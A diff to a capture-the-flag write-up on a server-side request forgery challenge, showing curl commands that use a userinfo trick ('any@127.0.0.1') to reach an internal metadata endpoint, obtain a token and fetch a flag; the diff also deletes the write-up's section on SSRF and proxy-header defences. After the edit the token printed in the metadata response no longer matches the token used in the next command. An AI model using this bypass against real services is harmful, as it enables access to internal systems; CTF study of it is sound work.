@@ -87,7 +87,7 @@ Request Blocked
 
 Same idea with `127.0.0.1` also got blocked.
 
-![Confused reaction](https://media.giphy.com/media/6uGhT1O4sxpi8/giphy.gif)
+![huuuh](https://media.giphy.com/media/6uGhT1O4sxpi8/giphy.gif)
 
 This is where the error split mattered:
 
@@ -439,9 +439,9 @@ curl -sS \
 
 ```json
 {
-  "body": "{\"note\":\"present this token to the internal admin route as ?token=\",\"token\":\"5bbf2c858d8464a23c56560cb1501ccc\"}\n",
-  "status": 200,
-  "url": "http://any@127.0.0.1:8081/metadata"
+  "body":"{\"note\":\"present this token to /admin/flag as ?token=\",\"token\":\"b48f5a9ce22698e88f5d132e82afa4e3\"}\n",
+  "status":200,
+  "url":"http://any@127.0.0.1:8081/metadata"
 }
 ```
 
@@ -449,56 +449,26 @@ That response proves the SSRF worked. At that point the external filter was no l
 
 Also, the token step is useful triage. If the internal endpoint says "missing token" or "invalid token", that can still mean the SSRF is working. The network boundary is crossed; the remaining problem is just the internal app's own logic.
 
-The token can rotate, so the real method is: fetch `/metadata`, parse the returned token, then use that token on the internal admin route.
+The token can rotate, so the real method is: fetch `/metadata`, parse the returned token, then use that token on the internal admin route `/admin/flag`.
 
 ### Step 2: use the token on the internal admin route
 
 ```bash
 curl -sS \
-  'https://throughfall-anabasis.onrender.com/preview?url=http://any@127.0.0.1:8081/<internal-admin-route>?token=5bbf2c858d8464a23c56560cb1501ccc'
+  'https://throughfall-anabasis.onrender.com/preview?url=http://any@127.0.0.1:8081/admin/flag?token=5bbf2c858d8464a23c56560cb1501ccc'
 ```
 
 ```json
 {
   "body": "{\"flag\":\"itc{4_c0v3r_f0r_4_h1gh3r_f0rm}\"}\n",
   "status": 200,
-  "url": "http://any@127.0.0.1:8081/<internal-admin-route>?token=5bbf2c858d8464a23c56560cb1501ccc"
+  "url": "http://any@127.0.0.1:8081/admin/flag?token=5bbf2c858d8464a23c56560cb1501ccc"
 }
 ```
 
-![Victory reaction](https://media.giphy.com/media/LmNwrBhejkK9EFP504/giphy.gif)
+![lesgoooooo](https://media.giphy.com/media/LmNwrBhejkK9EFP504/giphy.gif)
 
 ![Challenge 3 solved](photos/chall-3-solved.png)
-
-## The real lesson
-
-All three challenges are basically the same warning wearing different clothes:
-
-> Do not validate one representation and then execute another.
-
-For proxy headers:
-
-- only trust `X-Forwarded-For` or `Forwarded` from proxies you control
-- strip client-supplied forwarding headers at the edge
-- define exactly how duplicates are handled
-- reject weird repeated forwarding metadata if you do not need it
-- normalize IPs before classification, including IPv4, IPv6, IPv4-mapped IPv6, compressed forms, and alternate numeric forms
-
-For SSRF:
-
-- parse URLs with a real parser
-- reject userinfo unless you explicitly need it
-- validate the exact parsed object the HTTP client will use
-- resolve DNS before connecting
-- block private, loopback, link-local, and metadata ranges after resolution
-- re-check redirects, because the first URL is not always the final destination
-
-And for triage:
-
-- different 403s matter
-- `x-request-blocked: 1` means an outer policy layer saw something it recognized as blocked
-- a normal app 403 means the request reached business logic but failed the authorization condition
-
 
 ## Flags
 
